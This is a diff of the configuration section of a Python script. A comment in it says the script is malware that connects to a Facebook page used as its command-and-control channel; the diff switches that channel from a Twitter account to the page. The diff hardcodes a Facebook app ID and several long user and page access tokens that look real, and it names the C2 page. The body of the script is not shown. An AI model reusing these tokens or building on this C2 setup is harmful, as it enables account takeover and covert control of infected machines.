@@ -1,19 +1,17 @@
 #!/usr/bin/python3
 import facebook
 
-
 # TODO keys, tokens, etc.
+# TODO pretty sure I don't need any of these.
 APP_ID = '821222461720870'
 APP_SECRET = ''
 USER_SHORT_ACCESS_TOKEN = 'EAALq5cEcySYBAE3g1G9rOQjFAfy9wTyxVtepaVgsET5d1Fc7cHZBefVVY1bRGAvTxZBwDZBewyyvK7axGoU3S5hxNALIDLSHqLCOtZAA1Qsf59C3JTDZA2ekc62HEWGweWM7Bgca52rTjVtCSw9PIfKgxQslZA34ajMCW0AZBfcZAl4TBvqjQksCw6eeyeOT1KqUYpLmVhOeuZBclOJcmzQYLQCqUZBGSVZCqXQaKZBiVy4jZCQZDZD'
 USER_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBAOckvAQIm1ZC9NWXRepXEx9zclliZCQJOuMeWGlFJak8yx28KdVRoxOe2kcyNNahzoGadgXRf4OV4zfyXUkiapTdQY6kqnSuYKNTZAYb1UF84fRe5lLUUx23QG3ZBT6ChNvRyTRifnTqQZByHbIx3YcNQ1mEPTwZDZD'
 
+# This token is good until like June.
 PAGE_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBADHemZAiRUqTHaJwjGZAh1pZCBbm3LnLovTgorO7dDPbXZAUu31l8k8TrYBJPaWivcsihd0PfnHTMgdTvNharhxAtToIUAOX4AdgZCJZCGiLLQKbOl5Gj8fkarbbr7K9FL6XY45e7XbpzbAymN5pU3doc3qmzFgwZDZD'
-PAGE_USERNAME = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
-
 # The static account to which the malware connects.
-# TODO actually create this twitter account.
-STATIC_C2_ACCOUNT = 'Sulla09366348'
+STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
 
 
 def main():
